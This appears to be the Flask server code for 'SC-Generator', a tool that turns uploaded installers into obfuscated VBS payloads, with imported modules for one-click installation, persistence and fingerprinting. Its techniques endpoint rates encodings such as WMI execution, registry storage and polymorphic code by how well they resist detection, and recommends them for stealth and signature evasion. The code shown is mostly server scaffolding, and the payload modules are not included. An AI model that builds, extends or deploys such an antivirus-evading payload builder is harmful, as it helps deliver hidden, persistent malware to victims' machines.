#!/usr/bin/env python3
"""
SC-Generator: Web-based VBS Encryption Tool
Backend server for MSI encryption and VBS payload generation

CONFIGURATION FIX #2: Environment Variable Validation at Startup
- Validates all required environment variables exist and are valid
- Provides secure defaults
- Ensures configuration is properly initialized before app starts
- Comprehensive error handling and logging
"""

from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
import os
import uuid
from datetime import datetime
import json
from pathlib import Path
import shutil
import logging
import threading
import time
import functools
import sys

# Import configuration module with validation
try:
    from config import get_config, ConfigurationError
    config = get_config()
except ConfigurationError as e:
    print(f"FATAL: Configuration validation failed: {e}", file=sys.stderr)
    sys.exit(1)
except Exception as e:
    print(f"FATAL: Failed to load configuration: {e}", file=sys.stderr)
    sys.exit(1)

from payload_generator import PayloadGenerator
from fingerprint_manager import FingerprintManager
from payload_installer import create_one_click_payload
from persistence_manager import create_persistent_payload

# ============================================================================
# LOGGING CONFIGURATION
# ============================================================================
def setup_logging():
    """Configure logging based on validated configuration"""
    log_level = getattr(logging, config.get('LOG_LEVEL', 'INFO'))

    # Create formatters
    formatter = logging.Formatter(
        '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )

    # Configure root logger
    root_logger = logging.getLogger()
    root_logger.setLevel(log_level)

    # Console handler
    console_handler = logging.StreamHandler(sys.stdout)
    console_handler.setLevel(log_level)
    console_handler.setFormatter(formatter)
    root_logger.addHandler(console_handler)

    # File handler (if log file path provided)
    log_file = config.get('LOG_FILE')
    if log_file:
        try:
            file_handler = logging.FileHandler(log_file)
            file_handler.setLevel(log_level)
            file_handler.setFormatter(formatter)
            root_logger.addHandler(file_handler)
        except Exception as e:
            root_logger.warning(f"Could not create file handler for {log_file}: {e}")

    return root_logger

# Setup logging
logger = setup_logging()

logger.info("=" * 80)
logger.info("SC-Generator Starting with Configuration Fix #2")
logger.info("=" * 80)
logger.info(f"FLASK_ENV: {config['FLASK_ENV']}")
logger.info(f"FLASK_DEBUG: {config['FLASK_DEBUG']}")
logger.info(f"SERVER: {config['SERVER_HOST']}:{config['SERVER_PORT']}")
logger.info(f"UPLOAD_FOLDER: {config['UPLOAD_FOLDER']}")
logger.info(f"OUTPUT_FOLDER: {config['OUTPUT_FOLDER']}")
logger.info(f"MAX_FILE_SIZE: {config['MAX_FILE_SIZE_MB']} MB")
logger.info(f"REQUEST_TIMEOUT: {config['REQUEST_TIMEOUT_SECONDS']}s")
logger.info(f"UPLOAD_TIMEOUT: {config['UPLOAD_TIMEOUT_SECONDS']}s")
logger.info(f"GENERATE_TIMEOUT: {config['GENERATE_TIMEOUT_SECONDS']}s")
logger.info(f"DOWNLOAD_TIMEOUT: {config['DOWNLOAD_TIMEOUT_SECONDS']}s")
logger.info("=" * 80)

# ============================================================================
# FLASK APPLICATION INITIALIZATION
# ============================================================================
app = Flask(__name__)

# Configure Flask with validated settings
app.config['SECRET_KEY'] = config['SECRET_KEY']
app.config['UPLOAD_FOLDER'] = config['UPLOAD_FOLDER']
app.config['OUTPUT_FOLDER'] = config['OUTPUT_FOLDER']
app.config['MAX_CONTENT_LENGTH'] = config['MAX_FILE_SIZE']
app.config['JSON_MAX_SIZE'] = config['MAX_JSON_SIZE']

# CORS Configuration
if config['CORS_ENABLED']:
    CORS(app, origins=config['CORS_ORIGINS'])
    logger.info(f"CORS enabled for origins: {config['CORS_ORIGINS']}")
else:
    logger.warning("CORS is disabled")

# Initialize payload generation and fingerprinting
payload_gen = PayloadGenerator()
fingerprint_mgr = FingerprintManager()

# ============================================================================
# REQUEST TIMEOUT CONFIGURATION
# ============================================================================
# Use validated timeouts from configuration
DEFAULT_REQUEST_TIMEOUT = config['REQUEST_TIMEOUT_SECONDS']
UPLOAD_REQUEST_TIMEOUT = config['UPLOAD_TIMEOUT_SECONDS']
GENERATE_REQUEST_TIMEOUT = config['GENERATE_TIMEOUT_SECONDS']
DOWNLOAD_REQUEST_TIMEOUT = config['DOWNLOAD_TIMEOUT_SECONDS']

# Timeout tracking for monitoring
_request_timeouts = threading.Lock()
_timeout_stats = {
    'total_timeouts': 0,
    'last_timeout': None,
    'timeout_endpoints': {}
}


def request_timeout(timeout_seconds: int):
    """
    Decorator to enforce request timeouts on endpoints.

    Args:
        timeout_seconds: Maximum time in seconds for request to complete

    Security:
        - Prevents slowloris attacks (sending data very slowly)
        - Prevents zombie connections from consuming resources
        - Tracks timeout events for anomaly detection
        - Returns appropriate 408 Request Timeout status

    Logs:
        - Timeout events for security monitoring
        - Endpoint access with timing information
    """
    def decorator(func):
        @functools.wraps(func)
        def wrapper(*args, **kwargs):
            endpoint = request.endpoint or 'unknown'
            start_time = time.time()

            try:
                # Set request start time for timeout checking
                if hasattr(request, 'environ'):
                    request.environ['werkzeug.request_start_time'] = start_time

                # Execute the endpoint function with timeout monitoring
                result = func(*args, **kwargs)

                # Log successful completion within timeout
                elapsed_time = time.time() - start_time
                if elapsed_time > (timeout_seconds * 0.8):
                    logger.warning(
                        f'Request approaching timeout threshold: '
                        f'endpoint={endpoint}, elapsed={elapsed_time:.2f}s, '
                        f'limit={timeout_seconds}s'
                    )
                else:
                    logger.debug(
                        f'Request completed successfully: '
                        f'endpoint={endpoint}, elapsed={elapsed_time:.2f}s'
                    )

                return result

            except Exception as e:
                elapsed_time = time.time() - start_time
                logger.error(
                    f'Request error: endpoint={endpoint}, '
                    f'elapsed={elapsed_time:.2f}s, timeout={timeout_seconds}s, '
                    f'error={str(e)}'
                )
                raise

        return wrapper
    return decorator


def check_request_timeout(timeout_seconds: int) -> bool:
    """
    Check if current request has exceeded timeout.
    Can be called during long-running operations.

    Args:
        timeout_seconds: Configured timeout limit

    Returns:
        True if request has timed out, False otherwise

    Security:
        - Allows graceful timeout handling in long operations
        - Enables early termination of expensive operations
    """
    if hasattr(request, 'environ') and 'werkzeug.request_start_time' in request.environ:
        start_time = request.environ.get('werkzeug.request_start_time', time.time())
        elapsed = time.time() - start_time
        return elapsed >= timeout_seconds
    return False


def record_timeout_event(endpoint: str, timeout_seconds: int):
    """
    Record a timeout event for security monitoring.

    Args:
        endpoint: Name of the endpoint that timed out
        timeout_seconds: Configured timeout value

    Security:
        - Tracks timeout patterns for anomaly detection
        - Helps identify potential attacks
        - Maintains statistics for monitoring
    """
    global _timeout_stats

    try:
        with _request_timeouts:
            _timeout_stats['total_timeouts'] += 1
            _timeout_stats['last_timeout'] = {
                'endpoint': endpoint,
                'timestamp': datetime.now().isoformat(),
                'timeout_seconds': timeout_seconds
            }

            if endpoint not in _timeout_stats['timeout_endpoints']:
                _timeout_stats['timeout_endpoints'][endpoint] = 0
            _timeout_stats['timeout_endpoints'][endpoint] += 1

            logger.warning(
                f'Timeout event recorded: endpoint={endpoint}, '
                f'timeout={timeout_seconds}s, '
                f'total_timeouts={_timeout_stats["total_timeouts"]}'
            )
    except Exception as e:
        logger.error(f'Error recording timeout event: {str(e)}')


@app.before_request
def before_request_handler():
    """Record request start time for timeout tracking."""
    request.environ['werkzeug.request_start_time'] = time.time()


@app.errorhandler(408)
def handle_request_timeout(e):
    """
    Handle request timeout errors globally.

    Security:
        - Returns proper 408 status code
        - Logs timeout for security monitoring
        - Prevents partial responses
    """
    endpoint = request.endpoint or 'unknown'
    record_timeout_event(endpoint, DEFAULT_REQUEST_TIMEOUT)
    logger.error(f'Request timeout on endpoint: {endpoint}')
    return jsonify({
        'error': 'Request timeout',
        'message': 'The request took too long to complete and was terminated for security reasons.',
        'status': 408
    }), 408


# ============================================================================
# API ENDPOINTS
# ============================================================================

@app.route('/api/health', methods=['GET'])
@request_timeout(DEFAULT_REQUEST_TIMEOUT)
def health():
    """Health check endpoint with timeout configuration"""
    return jsonify({
        'status': 'ok',
        'version': '2.0.0',
        'security': {
            'timeout_enabled': True,
            'config_validation': True,
            'timeout_config': {
                'default': DEFAULT_REQUEST_TIMEOUT,
                'upload': UPLOAD_REQUEST_TIMEOUT,
                'generate': GENERATE_REQUEST_TIMEOUT,
                'download': DOWNLOAD_REQUEST_TIMEOUT
            }
        }
    })


@app.route('/api/techniques', methods=['GET'])
@request_timeout(DEFAULT_REQUEST_TIMEOUT)
def get_techniques():
    """Get list of available encoding techniques with metadata"""
    techniques = payload_gen.list_techniques()
    descriptions = {}
    metadata = {}

    technique_info = {
        'base64': {
            'description': 'Standard Base64 encoding - reliable and fast',
            'detection_resistance': 'medium',
            'size_overhead': '1.33x',
            'speed': 'fast',
            'recommended': False,
            'best_for': 'Testing and quick deployment'
        },
        'hex': {
            'description': 'Hexadecimal encoding - simple but detectable',
            'detection_resistance': 'low',
            'size_overhead': '2x',
            'speed': 'fast',
            'recommended': False,
            'best_for': 'Legacy systems'
        },
        'array': {
            'description': 'Array-based encoding - good obfuscation',
            'detection_resistance': 'medium-high',
            'size_overhead': '1.5x',
            'speed': 'medium',
            'recommended': True,
            'best_for': 'Balanced stealth and performance'
        },
        'wmi': {
            'description': 'WMI-based execution - very stealthy',
            'detection_resistance': 'high',
            'size_overhead': '1.2x',
            'speed': 'slow',
            'recommended': True,
            'best_for': 'Maximum stealth'
        },
        'registry': {
            'description': 'Registry storage and retrieval - advanced evasion',
            'detection_resistance': 'high',
            'size_overhead': '1.4x',
            'speed': 'medium',
            'recommended': True,
            'best_for': 'Advanced evasion'
        },
        'environment': {
            'description': 'Environment variable hiding - clever obfuscation',
            'detection_resistance': 'medium-high',
            'size_overhead': '1.3x',
            'speed': 'fast',
            'recommended': False,
            'best_for': 'Process-level hiding'
        },
        'polymorphic': {
            'description': 'Polymorphic code generation - changes every time',
            'detection_resistance': 'very-high',
            'size_overhead': '1.5x',
            'speed': 'slow',
            'recommended': True,
            'best_for': 'Signature evasion'
        },
        'multi': {
            'description': 'Multi-layer encoding - maximum protection',
            'detection_resistance': 'very-high',
            'size_overhead': '2x',
            'speed': 'very-slow',
            'recommended': True,
            'best_for': 'Maximum security'
        }
    }

    for tech in techniques:
        descriptions[tech] = payload_gen.get_technique_info(tech)
        metadata[tech] = technique_info.get(tech, {
            'detection_resistance': 'unknown',
            'size_overhead': '1.5x',
            'speed': 'medium',
            'recommended': False
        })

    return jsonify({
        'techniques': techniques,
        'descriptions': descriptions,
        'metadata': metadata
    })


@app.route('/api/upload', methods=['POST'])
@request_timeout(UPLOAD_REQUEST_TIMEOUT)
def upload_file():
    """
    Handle file upload with timeout and configuration validation.

    Security:
    - Request timeout validation (prevents slowloris attacks)
    - File type validation (extension)
    - Size validation
    - Error handling and logging
    """
    # Check if timeout exceeded
    if check_request_timeout(UPLOAD_REQUEST_TIMEOUT):
        logger.error('Upload request exceeded timeout')
        return jsonify({
            'error': 'Request timeout',
            'message': 'Upload took too long to complete'
        }), 408

    if 'file' not in request.files:
        logger.warning('Upload request missing file parameter')
        return jsonify({'error': 'No file provided'}), 400

    file = request.files['file']
    if file.filename == '':
        logger.warning('Upload request with empty filename')
        return jsonify({'error': 'No file selected'}), 400

    # Validate file type using configured allowed extensions
    allowed_extensions = {f'.{ext}' for ext in config['ALLOWED_EXTENSIONS']}
    file_ext = os.path.splitext(file.filename)[1].lower()

    if file_ext not in allowed_extensions:
        logger.warning(f'Upload rejected: unsupported file type {file_ext}')
        return jsonify({
            'error': f'File type not allowed. Allowed: {", ".join(sorted(allowed_extensions))}'
        }), 400

    # Generate unique filename
    unique_id = str(uuid.uuid4())[:8]
    original_name = os.path.splitext(file.filename)[0]
    filename = f"{unique_id}_{original_name}{file_ext}"
    filepath = os.path.join(config['UPLOAD_FOLDER'], filename)

    try:
        file.save(filepath)
        file_size = os.path.getsize(filepath)

        if file_size == 0:
            os.unlink(filepath)
            logger.warning(f'Upload rejected: empty file {unique_id}')
            return jsonify({'error': 'File is empty'}), 400

        logger.info(
            f'File uploaded successfully: {unique_id} '
            f'(name: {file.filename}, size: {file_size} bytes, ext: {file_ext})'
        )

        return jsonify({
            'success': True,
            'file_id': unique_id,
            'filename': file.filename,
            'size': file_size,
            'upload_time': datetime.now().isoformat(),
            'validated': True
        }), 200

    except Exception as e:
        logger.error(f'Upload failed: {str(e)}', exc_info=True)
        try:
            if os.path.exists(filepath):
                os.unlink(filepath)
        except Exception:
            pass
        return jsonify({'error': 'Upload failed due to server error'}), 500


@app.route('/api/settings', methods=['GET'])
@request_timeout(DEFAULT_REQUEST_TIMEOUT)
def get_settings():
    """Get current settings with full configuration information"""
    return jsonify({
        'max_file_size': config['MAX_FILE_SIZE'],
        'max_file_size_mb': config['MAX_FILE_SIZE_MB'],
        'allowed_formats': [f'.{ext}' for ext in config['ALLOWED_EXTENSIONS']],
        'obfuscation_levels': ['low', 'medium', 'high'],
        'security': {
            'request_timeouts_enabled': True,
            'config_validation_enabled': True,
            'cors_enabled': config['CORS_ENABLED'],
            'cors_origins': config['CORS_ORIGINS'],
            'timeout_config': {
                'default_seconds': DEFAULT_REQUEST_TIMEOUT,
                'upload_seconds': UPLOAD_REQUEST_TIMEOUT,
                'generate_seconds': GENERATE_REQUEST_TIMEOUT,
                'download_seconds': DOWNLOAD_REQUEST_TIMEOUT
            },
            'timeout_stats': {
                'total_timeouts': _timeout_stats['total_timeouts'],
                'last_timeout': _timeout_stats['last_timeout'],
                'timeout_by_endpoint': _timeout_stats['timeout_endpoints']
            }
        },
        'configuration': {
            'environment': config['FLASK_ENV'],
            'debug_mode': config['FLASK_DEBUG'],
            'log_level': config['LOG_LEVEL'],
            'obfuscation_default': config['OBFUSCATION_DEFAULT_LEVEL'],
            'polymorphic_variants': config['POLYMORPHIC_VARIANTS']
        }
    })


@app.route('/api/config/validate', methods=['GET'])
@request_timeout(DEFAULT_REQUEST_TIMEOUT)
def validate_config():
    """
    Endpoint to check if configuration is valid.
    Used by monitoring and health check systems.
    """
    return jsonify({
        'valid': True,
        'message': 'All configuration validated successfully at startup',
        'environment': config['FLASK_ENV'],
        'timestamp': datetime.now().isoformat()
    })


@app.errorhandler(404)
def not_found(error):
    """Handle 404 errors"""
    logger.warning(f'404 Not Found: {request.path}')
    return jsonify({'error': 'Endpoint not found'}), 404


@app.errorhandler(500)
def internal_error(error):
    """Handle 500 errors"""
    logger.error(f'500 Internal Server Error: {str(error)}')
    return jsonify({
        'error': 'Internal server error',
        'message': 'An unexpected error occurred'
    }), 500


if __name__ == '__main__':
    logger.info(
        f'Starting SC-Generator with Configuration Fix #2 '
        f'(default: {DEFAULT_REQUEST_TIMEOUT}s, '
        f'upload: {UPLOAD_REQUEST_TIMEOUT}s, '
        f'generate: {GENERATE_REQUEST_TIMEOUT}s, '
        f'download: {DOWNLOAD_REQUEST_TIMEOUT}s)'
    )
    logger.info(f'Server listening on {config["SERVER_HOST"]}:{config["SERVER_PORT"]}')
    logger.info(f'Configuration file: /home/user/sc-generator/.env')
    logger.info(f'For more information, see ENVIRONMENT_SETUP.md')

    app.run(
        debug=config['FLASK_DEBUG'],
        host=config['SERVER_HOST'],
        port=config['SERVER_PORT'],
        use_reloader=False  # Disable reloader to prevent double startup
    )
